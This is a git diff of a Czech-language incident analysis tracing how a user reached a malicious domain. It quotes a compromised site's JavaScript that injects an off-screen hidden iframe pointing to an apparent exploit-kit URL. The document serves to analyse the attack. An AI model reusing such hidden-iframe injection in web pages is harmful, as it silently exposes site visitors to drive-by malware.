@@ -43,7 +43,7 @@ http://tyu.benme.com/%3fct=Vivaldi&biw=Vivaldi.95ec76.406i7c5k7&oq=h8fItKeRVawGy
 
 ### 2. Jak se uživatel dostal na danou doménu?
 
-http://retrotip.visionurbana.com.ve/dle_js.js
+`http://retrotip.visionurbana.com.ve/dle_js.js`
 
 ```
 document.write('<div class="" style="position:absolute; width:383px; height:368px; left:17px; top:-858px;">  <div  style="" class=""><a>head</a><a class="head-menu-2"> </a><iframe src="http://tyu.benme.com/?q=zn_QMvXcJwDQDofGMvrESLtEMUbQA0KK2OH_76iyEoH9JHT1vrTUSkrttgWC&biw=Amaya.81lp85.406f4y5l9&oq=elTX_fUlL7ABPAuy2EyALQZnlY0IU1IQ8fj630PWwUWZ0pDRqx29UToBvdeW&yus=Amaya.110oz60.406a7e5q8&br_fl=4109&tuif=5364&ct=Amaya" width=290 height=257 ></ifr' +'ame> <a style=""></a></div><a class="" style="">temp</a></div>');
